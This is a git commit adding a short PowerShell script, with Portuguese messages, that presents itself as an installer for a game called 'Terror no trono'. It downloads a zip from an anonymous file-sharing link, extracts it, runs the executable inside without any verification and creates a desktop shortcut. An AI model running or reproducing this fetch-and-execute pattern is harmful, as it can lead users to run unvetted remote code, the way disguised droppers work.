e7be943bd2e828b78155640d47e6e292153f1a3f
zslfgkdghjklswdf <120216371+zslfgkdghjklswdf@users.noreply.github.com>
2023-09-28 19:11:23 -0300

    Add files via upload

---
+++ final2.ps1
@@ -0,0 +1,38 @@
+# Import the required modules
+import-module PowerShellGet
+echo "Iniciando instalacao"
+echo "Por estar sendo baixado por powershell, vai demorar bem mais tempo que o normal para baixar"
+echo "."
+echo "."
+echo "."
+echo "."
+echo "."
+echo "."
+echo "E nao feche essa janela porque pode corromper os arquivos do jogo"
+echo "O jogo vai abrir sozinho quando terminar de instalar"
+
+# Download the Terror no trono.zip file
+Invoke-WebRequest -Uri "https://filetransfer.io/data-package/eeML0ZKe/download" -OutFile "$env:USERPROFILE\Documents\Terror no trono.zip"
+
+# Extract the Terror no trono.zip file
+Expand-Archive -Path "$env:USERPROFILE\Documents\Terror no trono.zip" -DestinationPath "$env:USERPROFILE\Documents\"
+
+# Execute the Terror no trono.exe file
+Start-Process -FilePath "$env:USERPROFILE\Documents\Terror_no_trono\Terror no trono.exe"
+
+# Caminho para o arquivo executado
+$exePath = "$env:USERPROFILE\Documents\Terror_no_trono\Terror no trono.exe"
+
+# Caminho para o arquivo de atalho na área de trabalho
+$shortcutPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), "Terror no trono.lnk")
+
+# Criar um objeto WScript.Shell para criar o atalho
+$shell = New-Object -ComObject WScript.Shell
+
+# Criar o atalho
+$shortcut = $shell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $exePath
+$shortcut.Save()
+
+# Exibir mensagem de conclusão
+Write-Host "Atalho para o arquivo executado foi criado na área de trabalho."
